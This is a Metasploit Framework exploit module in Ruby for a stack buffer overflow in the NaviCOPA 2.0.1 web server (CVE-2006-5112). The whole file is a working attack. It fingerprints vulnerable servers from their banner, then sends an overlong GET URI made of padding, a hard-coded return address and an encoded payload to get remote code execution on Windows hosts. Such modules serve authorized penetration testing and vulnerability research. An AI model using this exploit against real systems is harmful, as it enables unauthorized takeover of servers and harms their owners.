##
# $Id: navicopa_get_overflow.rb 9797 2010-07-12 23:25:31Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerprint = { :pattern => [ /InterVations/ ] }

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'NaviCOPA 2.0.1 URL Handling Buffer Overflow\',
			\'Description\'    => %q{
				This module exploits a stack buffer overflow in NaviCOPA 2.0.1.
				The vulnerability is caused due to a boundary error within the
				handling of URL parameters.
			},
			\'Author\'         => \'MC\',
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: 9797 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2006-5112\' ],
					[ \'OSVDB\', \'29257\' ],
					[ \'BID\', \'20250\' ],
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'thread\',
				},
			\'Privileged\'     => true,
			\'Payload\'        =>
				{
					\'Space\'    => 400,
					\'BadChars\' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",
					\'StackAdjustment\' => -3500,
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					[\'NaviCOPA 2.0.1 Universal\', { \'Ret\' => 0x1009b4ff }], # IV320009.dll
				],
			\'DisclosureDate\' => \'Sep 28 2006\',
			\'DefaultTarget\'  => 0))

		register_options(
			[
				Opt::RPORT(80)
			], self.class )
	end

	def check
		connect

		sock.put(\"GET / HTTP/1.0\\r\\n\\r\\n\")
		resp = sock.get_once
		disconnect

		if (resp =~ /2.01 11th September/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		sploit =  rand_text_alphanumeric(228, payload_badchars)
		sploit << [target.ret].pack(\'V\') + payload.encoded

		uri = \'/\' + sploit

		res = \"GET #{uri} HTTP/1.1\\r\\n\\r\\n\"

		print_status(\"Trying target %s\" % target.name)

		sock.put(res)
		sock.close

		handler
		disconnect
	end

end
